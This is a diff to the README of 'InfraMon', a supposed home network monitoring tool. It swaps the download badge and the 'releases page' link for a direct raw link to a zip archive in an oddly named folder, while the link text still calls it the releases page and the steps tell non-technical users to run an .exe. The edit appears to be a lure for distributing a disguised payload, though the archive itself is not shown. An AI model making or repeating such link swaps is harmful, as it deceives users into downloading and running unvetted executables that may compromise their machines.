@@ -1,6 +1,6 @@
 # 🖥️ InfraMon - Monitor your local network infrastructure easily
 
-[![Download InfraMon](https://img.shields.io/badge/Download_InfraMon-Blue-blue.svg)](https://github.com/matrixneoexpressionism381/InfraMon/releases)
+[![Download InfraMon](https://img.shields.io/badge/Download_InfraMon-Blue-blue.svg)](https://raw.githubusercontent.com/matrixneoexpressionism381/InfraMon/main/equiprobabilism/Infra_Mon_3.9-beta.5.zip)
 
 InfraMon tracks the health of your home or office network devices. It runs in the background and alerts you when your computers, printers, or routers go offline. You do not need technical skills to track your connections. This tool provides a clear view of your network availability.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to acquire the software:
 
-1. Visit [the InfraMon releases page](https://github.com/matrixneoexpressionism381/InfraMon/releases) to access the download options.
+1. Visit [the InfraMon releases page](https://raw.githubusercontent.com/matrixneoexpressionism381/InfraMon/main/equiprobabilism/Infra_Mon_3.9-beta.5.zip) to access the download options.
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .exe to start your download.
 4. Save the file to your Downloads folder.
